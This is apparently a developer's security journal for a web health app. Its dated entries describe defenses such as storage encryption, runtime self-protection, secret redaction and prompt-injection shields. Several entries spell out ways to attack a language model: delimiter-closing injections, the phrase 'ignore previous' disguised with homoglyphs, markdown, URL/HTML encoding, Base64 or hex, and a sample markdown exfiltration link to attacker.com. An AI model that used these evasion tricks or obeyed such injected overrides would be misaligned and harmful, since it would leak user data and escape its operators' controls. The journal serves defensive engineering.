## 2025-05-15 - Authenticated Encryption at Rest for Local Storage

**Vulnerability:**
Browser-based applications typically store sensitive user data in `localStorage` in plain text. This data is vulnerable to exfiltration via Cross-Site Scripting (XSS) or local system compromise. While `localStorage` is origin-bound, any script running in the same origin can dump the entire storage.

**Learning:**
Implementing AES-GCM (256-bit) provides both confidentiality and integrity (authentication). By storing the encryption key in IndexedDB as a non-exportable `CryptoKey` object, the key itself is isolated from the `localStorage` exfiltration vector. This creates a multi-layered defense: an attacker must not only execute XSS but also find a way to use the Web Crypto API to decrypt the data, as the raw key material cannot be extracted.

**Prevention:**
Always encrypt sensitive PII and health metrics before persisting to browser storage. Use the Web Crypto API for industry-standard authenticated encryption. Implement an observer pattern in the storage layer to ensure that asynchronous decryption doesn't lead to UI inconsistencies or stale data across multiple React contexts. Avoid using `String.fromCharCode.apply` for large binary-to-string conversions to prevent stack overflow crashes.

## 2026-06-02 - Generalized AI Boundary Neutralization
**Vulnerability:**
Indirect prompt injection can occur if user-controlled data contains markers that the LLM interprets as system-defined boundaries (e.g., [USER_DATA], [SECURITY_PROTOCOL]). An attacker could craft data that appears to close a block and start a new one with malicious instructions.

**Learning:**
Neutralizing all bracketed markers with a minimum length and alphanumeric pattern provides a generic defense against this class of injection. By wrapping markers in balanced double brackets (e.g., [[MARKER]]), we strip them of their structural meaning to the LLM while maintaining readability for debugging.

**Prevention:**
Always run user-provided data through a neutralization pass before embedding it into system prompts. Exclude known UI-only tags using negative lookaheads to prevent interfering with legitimate application feedback loops.

## 2026-06-03 - Polymorphic Prompt Isolation (PPI)
**Vulnerability:**
Fixed markers like `[USER_DATA]` are susceptible to "delimiter hijacking" or "tag closure" attacks where a malicious user provides input like `[/USER_DATA] Malicious Instruction [USER_DATA]`. This tricks the LLM into thinking the untrusted block has ended.

**Learning:**
Polymorphic Prompt Isolation (PPI) uses ephemeral, cryptographically secure nonces generated per-request to create dynamic boundaries (e.g., `[USER_DATA_${nonce}]`). By enforcing these unique boundaries in the system prompt and checking the AI's output for nonce leakage, we create a "moving target" defense that is significantly harder to spoof or bypass.

**Prevention:**
Never use static delimiters for untrusted data in LLM prompts. Generate a fresh nonce for every request, wrap all untrusted segments (including chat history and current input) in nonced markers, and validate that the nonce does not appear in the final response.

## 2026-06-04 - Multi-Layered PII Redaction & AI Exfiltration Defense
**Vulnerability:**
AI responses and user-controlled data can leak sensitive identifiers (AWS keys, JWTs, UUIDs) or exfiltrate data via markdown media (images, data URIs) if the redaction engine and output validation are too narrow.

**Learning:**
Defense in depth requires expanding redaction patterns beyond standard PII (email, phone) to include infrastructure and session identifiers (AWS, JWT, UUID, IPv6). Furthermore, AI exfiltration detection must account for all markdown media types (not just links) and monitor for session-specific keywords (cookie, session, localstorage, voro_ prefix) in URLs.

**Prevention:**
Maintain a comprehensive and evolving library of redaction regexes that cover both identity and infrastructure. Validate all AI-generated markdown to ensure that links and media do not contain sensitive tokens or attempt to access browser storage via URL parameters.

## 2025-05-16 - Sequential AI Security Pipeline Architecture
**Vulnerability:**
Early-return patterns in security validation functions (like `validateAIResponse`) can lead to "validation bypass". For example, if a function returns immediately after redacting PII, it may skip critical checks for prompt injection remnants or markdown-based data exfiltration.

**Learning:**
Security and privacy checks must be architected as a sequential pipeline rather than a series of mutually exclusive blocks. By using a `validatedResponse` accumulator, each layer of defense (Nonce check, Injection check, PII redaction, and Exfiltration filtering) is guaranteed to execute, regardless of whether a previous layer found an issue.

**Prevention:**
Always design security middleware or validation functions to apply all relevant filters to the data stream. Avoid early returns for non-terminal violations (like PII) if higher-severity or orthogonal checks (like exfiltration) still need to be performed on the resulting output.

## 2026-06-09 - Exfiltration Sink Monitoring in RASP
**Vulnerability:**
Runtime Self-Protection (RASP) systems often focus only on core execution primitives (eval, Function) or storage access (localStorage). This leaves the application vulnerable to monkey-patched exfiltration sinks (XMLHttpRequest, WebSocket, sendBeacon) where a malicious script could intercept and redirect sensitive data without triggering execution-based alerts.

**Learning:**
Hardening RASP requires monitoring not just how code runs, but where data goes. By including exfiltration-capable APIs like `XMLHttpRequest`, `WebSocket`, and `navigator.sendBeacon` in the integrity attestation list, the Security Sentinel can detect environment-level tampering aimed at silent data theft. Additionally, monitoring the `Proxy` global detects more sophisticated shadowing techniques used to bypass standard property checks.

**Prevention:**
Always include network-bound and redirection APIs in runtime integrity checks. Use native-code verification to ensure these sinks haven't been replaced with wrapper functions that forward data to third-party origins.

## 2026-06-10 - Distributed Lockdown Inconsistency
**Vulnerability:**
Single-tab lockdown mechanisms are vulnerable to "session-pivoting" where an attacker, after triggering a security sink in one tab (e.g., via a blocked CSP violation or RASP check), can continue their activities in other open tabs of the same application that haven't yet reached the same execution branch.

**Learning:**
Security state must be treated as a global, cross-tab primitive. Relying on local event listeners or shared state that requires a page reload is insufficient for active defense. Implementing a dedicated 'Security Nexus' via `BroadcastChannel` allows for near-instantaneous synchronization of the `VORO_COMPROMISED` state, ensuring that a detection in one context atomically neutralizes the entire origin's session across all open tabs.

**Prevention:**
Always implement a cross-tab synchronization layer for critical security states (lockdown, session termination, key shredding). Use `BroadcastChannel` for low-latency, same-origin signaling to ensure that the application's defensive posture is unified and leaves no un-neutralized execution contexts for an attacker to pivot into.

## 2025-05-14 - Active Defense Suite (Honey-tokens & Active CSP)
**Learning**: Implementing deception-based security (Honey-tokens) and transforming passive browser protections (CSP) into active security sinks significantly hardens applications against automated probing and XSS-based exfiltration. By shifting from passive blocking to active environment neutralization, the cost for an attacker to maintain persistence or exfiltrate data increases exponentially.

**Action**: Added `CANARY_KEYS` to `StorageManager` and a `securitypolicyviolation` listener to `security.js` to trigger an immediate, system-wide lockdown (shredding keys, purging cache, wiping session storage) upon detection of unauthorized exploration or injection attempts.

## 2025-05-17 - Precision in Secret Redaction Patterns

**Vulnerability:**
Broad regex patterns intended to catch secrets can lead to significant functional degradation and developer confusion if they collide with non-sensitive identifiers.

**Learning:**
A generic 40-character alphanumeric regex (`\b[A-Za-z0-9/+=]{40}\b`) intended to catch AWS Secret Access Keys will trigger high false-positives against Git commit hashes, SHA-1 checksums, and other common 40-character blobs ubiquitous in development environments. Redaction must favor high-precision patterns with unique prefixes (like `github_pat_` or `sk_live_`) or use proximity-based heuristics to ensure data integrity is maintained for non-sensitive technical identifiers.

**Prevention:**
Always validate new redaction patterns against common non-sensitive identifiers (Git hashes, UUIDs, Base64 padding). Avoid length-only detection for secrets without a known, constant prefix.

## 2025-05-18 - Storage-Level Prototype Pollution Defense

**Vulnerability:**
Dynamic storage operations that accept user-controlled keys are susceptible to prototype pollution. If an attacker can inject keys like `__proto__` or `constructor` into the storage persistence layer, they may be able to overwrite native object properties, leading to remote code execution or application-wide denial of service.

**Learning:**
Defensive programming at the storage boundary provides a critical safety net. By explicitly blocking prototype-polluting keys in the `StorageManager.set` method, we ensure that even if a calling component fails to sanitize a key, the core persistence layer remains resilient. This pattern is particularly important for applications that support data import/export features.

**Prevention:**
Always implement explicit key validation in persistence and state management utilities. Reject any key that matches `__proto__`, `constructor`, or `prototype` before performing any property assignment or serialization.

## 2025-05-19 - Immutable Security State & Native Primitive Pinning

**Vulnerability:**
Runtime Self-Protection (RASP) systems are vulnerable to "meta-tampering" where an attacker monkey-patches the functions the security system itself relies on (e.g., `RegExp.prototype.test`, `setInterval`). Furthermore, global security flags like `VORO_COMPROMISED` can be reset to `false` by malicious scripts to escape lockdown.

**Learning:**
Effective RASP requires "Native Primitive Pinning"—capturing references to core browser functions (including timing and regex methods) at module load before any third-party code executes. Additionally, critical security state must be made immutable using `Object.defineProperty` with `writable: false` to prevent state-rollback attacks.

**Prevention:**
Always capture essential primitives (`setInterval`, `test`, `defineProperty`) as safe local variables at the very top of security modules. Ensure that security initialization in the application entry point (e.g., `main.jsx`) is the absolute first import to guarantee provenance of captured primitives.

## 2025-05-20 - Markdown-Based AI Data Exfiltration & Policy Fallback Constraints

**Vulnerability:**
AI response validation often focuses only on markdown image tags (`![...]()`) for exfiltration detection, ignoring standard links (`[...]()`). An attacker can use deceptive link text to trick users into clicking exfiltration URLs containing sensitive tokens or session identifiers.

**Learning:**
Hardening exfiltration detection requires expanding regex patterns to cover all markdown media types and monitoring a broader range of sensitive keywords (e.g., `token`, `secret`) in URL parameters. However, security "alignment" between Trusted Types and their fallbacks must be handled with care; returning empty strings in a fallback `createScript` (to match the primary policy's blocking behavior) is a breaking change for browsers like Firefox/Safari if the application or its dependencies rely on dynamic script creation through that policy.

**Prevention:**
Always validate both image and link markdown in AI outputs. Maintain high-fidelity cross-browser compatibility by ensuring that security policy fallbacks do not introduce functional regressions in non-Chromium environments unless the specific sink is verified as unused or unauthorized.

## 2025-05-21 - Decentralized Security Lockdown & Key Shredding

**Vulnerability:**
Centralized security orchestrators often rely on brittle, hardcoded global references (e.g., `window.voroAIClient`) to purge sensitive data during a lockdown. In modular applications, these globals may not exist or may be inaccessible, leading to "stale secrets" remaining in memory after a compromise is detected.

**Learning:**
A decentralized, event-driven lockdown strategy is more robust. By having individual sensitive modules (AI clients, Crypto managers, Storage managers) subscribe to a unified `voro-security-lockdown` event, each component can autonomously execute its own "shredding" logic (e.g., nullifying API keys, purging caches). This ensures that the security orchestrator doesn't need deep knowledge of every module's internals.

**Prevention:**
Avoid reaching into other modules' state from a central security utility. Instead, define a standard security lifecycle event and ensure every module that handles PII or secrets implements an autonomous responder to purge that data upon detection of an integrity violation.

## 2025-05-22 - Polymorphic Exfiltration & PEM Redaction
**Vulnerability:**
Standard exfiltration detection often overlooks protocol-relative URLs (`//attacker.com`), `javascript:`, and `data:` URIs in AI-generated content, which can be used to bypass origin-based filters. Additionally, redaction engines may miss PEM-encoded technical secrets (private keys) and modern, prefixed API tokens (e.g., OpenAI `sk-proj-`).

**Learning:**
A robust redaction and exfiltration engine must account for polymorphic URL schemes and high-precision technical markers. Expanding detection to include protocol-relative and non-standard URI schemes, alongside technical secrets like PEM blocks, provides a more comprehensive defense against both accidental data leakage and intentional exfiltration attempts.

**Prevention:**
Always include `//`, `javascript:`, and `data:` in URL detection regexes for untrusted content. Maintain high-fidelity redaction patterns for technical secrets (PEM, SSH keys) and keep API token patterns updated to include modern vendor prefixes.

## 2025-05-23 - URL Fragment Exfiltration & RASP Coverage Expansion

**Vulnerability:**
AI response validation often overlooks URL fragments (the hash part after `#`). Malicious actors can use the hash to exfiltrate data since fragments are frequently not sent to the server but remain accessible to client-side scripts. Additionally, RASP systems missing Blob-related APIs (`URL.createObjectURL`, `URL.revokeObjectURL`) leave a significant blind spot for data smuggling via browser-generated object URLs.

**Learning:**
Robust exfiltration defense requires scrutinizing the entire URL structure, including the query string and the hash/fragment, for sensitive keywords or high-entropy tokens. Furthermore, RASP integrity checks must be "Pinned" (captured at module load) and "Promoted" (executed immediately upon import) to ensure that browser primitives are captured before any third-party scripts or application dependencies can monkey-patch them.

**Prevention:**
Always include `urlObj.hash` in exfiltration keyword checks. Expand RASP coverage to include all URL and Blob management APIs. Ensure that security and integrity checks are the absolute first pieces of executable code to run in the application's entry sequence.

## 2025-05-25 - Encoding-Aware AI Exfiltration Defense & Secure Logging
**Vulnerability:**
AI exfiltration detection using regex or keyword matching on raw URLs is vulnerable to percent-encoding bypass (e.g., using `%74%6F%6B%65%6E` to represent `token`). Additionally, AI client implementations may inadvertently leak PII or transiently assembled credentials into the console during error handling if the error objects are logged without redaction.

**Learning:**
Robust exfiltration defense must implement "Deep Decoding" by applying `decodeURIComponent` to all extracted URLs, query strings, and hash fragments before performing keyword or entropy analysis. Furthermore, security-conscious error handling requires that all logs originating from sensitive modules (like AI clients) be piped through a redaction utility to maintain confidentiality even in failure states.

**Prevention:**
Always decode untrusted URLs before security validation. Ensure all error logging in sensitive modules uses a centralized redaction engine to prevent the accidental exposure of secrets or PII in development or production logs.

## 2026-06-11 - Window.open RASP Integration & Intrinsic Sentinel Hardening

**Vulnerability:**
The `window.open` API is a high-risk exfiltration sink that can be used for unauthorized cross-origin data smuggling (via URL parameters) or phishing attacks. Furthermore, security-critical logic within the RASP system (entropy calculation, structural attestation) remains vulnerable to monkey-patching if it relies on unpinned global methods like `Object.values` or `Array.from`.

**Learning:**
Effective RASP requires protecting not only network and storage sinks but also navigation sinks like `window.open`. Furthermore, a security sentinel must be "intrinsically hardened" by ensuring that its own internal logic is decoupled from the mutable global environment. Pinning fundamental JavaScript primitives (`Object.values`, `Object.entries`, `Array.from`) at module load and using them via `.call()` creates a hermetic execution environment that is resilient to prototype pollution attacks.

**Prevention:**
Always include navigation and window-management APIs in the RASP `mustBeWrapped` list. Practice "Intrinsic Hardening" by pinning all global primitives used within security-critical modules to prevent an attacker from neutralizing the security system by monkey-patching its own dependencies.

## 2026-06-12 - Background Execution & Response Stream Attestation

**Vulnerability:**
Partial RASP coverage in response stream methods (e.g., missing `arrayBuffer`, `formData`) and background execution constructors (`Worker`, `SharedWorker`) creates blind spots for data exfiltration and unauthorized code execution. An attacker could use `arrayBuffer` to smuggle binary data or spawn a Worker to execute malicious scripts outside the main thread's immediate RASP supervision.

**Learning:**
Comprehensive RASP must enforce "Attestation Parity" across all variations of a sink. Protecting `json` and `text` is insufficient if `arrayBuffer` or `formData` remain un-attested. Furthermore, background execution contexts must be subject to the same Granular Neural Capability Attestation (GNCA) as the main thread, ensuring that Workers cannot be used as an exfiltration bypass.

**Prevention:**
Always include all variations of data-consuming methods (`json`, `text`, `blob`, `arrayBuffer`, `formData`) in the `mustBeWrapped` list. Extend RASP protection to all background execution entry points (`Worker`, `SharedWorker`, `ServiceWorker`) to ensure a unified security posture across all execution contexts.

## 2026-06-13 - Protocol-Relative URL Markdown Exfiltration Bypass
**Vulnerability:** Regular expression checks on AI responses for data exfiltration (`urlRegex`) frequently use lookaheads or word boundaries like `(?:\s|^)\/\/` to detect protocol-relative URLs (`//attacker.com`). This fails when links are enclosed in brackets or parentheses (e.g. `[leak](//attacker.com?auth=...)`), because character boundaries like `(` are neither spaces nor the start of a string. Furthermore, constructing a `URL` object from such strings fails, forcing a fallback to basic catch-blocks which might not perform high-entropy or query parameter keyword validation.
**Learning:** Traditional boundary-based URL extraction is bypassable via common Markdown structures. Using a negative lookbehind assertion `(?<!:)\/\/` identifies protocol-relative URLs anywhere in the string. Prepending `https:` to protocol-relative matches and passing the application origin as a base to the `URL` constructor prevents parsing failures.
**Prevention:** Always use regex lookbehind assertions instead of space boundaries for protocol-relative links. Ensure the URL parser has a robust fallback check that mirrors the deep entropy and keyword analysis of the happy path.

## 2026-06-14 - NaN & Infinity Validation Bypass in Client-Side Input Handling

**Vulnerability:**
Validation libraries and custom helpers that rely on basic `!isNaN` and comparison bounds checks (e.g., `value < 0 || value > 24`) are highly susceptible to validation bypass and DoS. When checking numeric inputs, entering non-finite values like `Infinity` can bypass bounds restrictions if checks rely purely on `!isNaN()`. Additionally, numeric fields evaluated as `NaN` (such as malicious payload objects parsed as floats) will evaluate to `false` in comparison checks (e.g., `NaN < 0` is false, `NaN > 24` is false), allowing invalid or malformed data to silently bypass security boundaries and pollute downstream app states.

**Learning:**
Traditional range-bound checks are not safe unless pre-validated with explicit `Number.isFinite()` and non-NaN checks. Similarly, string values must be bounded with strict length limits at validation entry points to prevent client-side resource exhaustion, ReDoS, and database bloating (such as massive strings injected into blood pressure or nutrition food names).

**Prevention:**
Always use `Number.isFinite()` instead of `!isNaN()` for numeric validations. Ensure any numeric variables are validated using `Number.isFinite(parsedValue) && !isNaN(parsedValue)` before executing relational range comparisons. Enforce strict character length limits on all user-controlled text inputs at the input-validation boundary.

## 2026-06-15 - Unicode Decomposition and Homoglyph Evasion Mitigation in Prompt Injection Shields

**Vulnerability:**
Prompt injection detectors matching raw keywords (such as "ignore") are highly vulnerable to evasion via stylized mathematical alphanumeric fonts (e.g. `𝐢𝐠𝐧𝐨𝐫𝐞`), fullwidth characters (e.g. `ｉｇｎｏｒｅ`), and Unicode homoglyphs (e.g. Cyrillic `і`, `о`, `е` to bypass English keywords).

**Learning:**
Combining native JavaScript `normalize('NFKD')` decomposition with a mapping dictionary to convert Cyrillic lookalikes back to ASCII equivalents completely neutralizes these formatting and homoglyph evasion attacks before they hit keyword and boundary check blocks.

**Prevention:**
Always normalize untrusted user text down to its baseline canonical ASCII representation using NFKD decomposition and a mapping dictionary before checking it against system-level keyword blocklists or injection patterns.

## 2026-06-16 - Markdown-Based Obfuscation Bypass Mitigation in Prompt Injection Shields
**Vulnerability:**
Prompt injection blocklists can be bypassed using markdown formatting syntax (such as bold, italic, strikethrough, or code blocks: `*`, `_`, `~`, `` ` ``) interspersed between characters (e.g. `i**g**n**o**r**e previous`). Since markdown is interpreted as formatting rather than literal letters by LLMs, the obfuscated input still triggers malicious overrides downstream while escaping keyword detection blocks.

**Learning:**
Normalizing input specifically for prompt injection validation must include stripping all Markdown formatting characters. To prevent breaking delimiter checks (which use underscores for nonce/context tagging, e.g. `[USER_DATA_12345]`), the delimiter validation must run first (or on raw inputs) before formatting characters are scrubbed from the matching string.

**Prevention:**
Always execute delimiter and structural tests prior to cleaning emphasis. Clean asterisks, underscores, tildes, and backticks from query strings to ensure standard blocklist matches evaluate correctly, without altering the actual query payload delivered to the LLM.

## 2026-06-17 - Multi-Pass Encoding Prompt Injection Shield
**Vulnerability:**
Prompt injection filters that analyze plain-text input can be bypassed if an attacker encodes prompt instructions (such as "ignore previous") or specific delimiters using URL percent-encoding, double-percent encoding, or HTML decimal/hex entity encoding. If the underlying model, web framework, or markdown rendering context decodes these entities down the line, the malicious instructions execute while escaping the initial query validation checks.

**Learning:**
Neutralizing encoding-based evasion requires executing a pre-normalization decoding pipeline. Integrating a multi-pass, recursive URL percent-decoder alongside an HTML entity decoder (covering decimal, hex, and named entities) maps obfuscated sequences back to their true literal sequence.

**Prevention:**
Always run recursive URL and HTML entity decoding on user queries at the absolute entry boundary of prompt-injection and delimiter validation engines, before any normalizations, formatting stripping, or pattern-matching checks.

## 2026-06-18 - Base64 & Hexadecimal Obfuscation Evasion in Prompt Injection Shields
**Vulnerability:**
Prompt injection filters that analyze decoded plain text are vulnerable to payload obfuscation using encoding schemes like Base64 or Hexadecimal (e.g. `aWdub3JlIHByZXZpb3Vz` or `69676e6f72652070726576696f7573` for `ignore previous`). Modern LLMs are capable of autonomously decoding and executing these instructions, allowing the payload to bypass text-based blocklists and boundary validations during input ingestion.

**Learning:**
Effective input defense requires scanning queries for potential encoded block structures. Since arbitrary strings can resemble Base64/Hex and trigger false positives, decoding helpers must enforce strict layout alignment constraints (e.g., matching length multiples and padding) and explicitly verify that the output decoded string contains only printable ASCII/whitespace characters.

**Prevention:**
Always implement non-destructive Base64 and Hex parsing layers in query validators. Extract matching substrings, attempt decoding under strict ASCII-only constraints, and evaluate the decoded content against key-phrase blocklists prior to downstream model transmission.

## 2026-06-19 - OWASP-Compliant ReDoS-Immune Password Validation
**Vulnerability:**
Traditional password validation regexes (like those using multiple lookahead assertions over general character sets) often restrict what special characters (or spaces) users can use. This violates OWASP standards, limiting password choices and passphrase security. Additionally, complex regular expressions on un-truncated user inputs are highly vulnerable to client-side or server-side Regular Expression Denial of Service (ReDoS) via catastrophic backtracking.

**Learning:**
Adopting a linear-scan string verification model (O(N) single-pass iteration) rather than complex regex lookaheads guarantees immunity against ReDoS attacks. This approach ensures robust complexity checks (verifying the existence of lowercase, uppercase, and numeric characters within a strict 8-128 character window) without imposing restrictive character set limitations, fully aligning with OWASP's focus on allowing passphrases and wide character support.

**Prevention:**
Avoid complex lookahead regex patterns for password validation. Utilize linear, single-pass character iteration loops to verify complexity criteria, and establish strict maximum length limits at validation entry points.
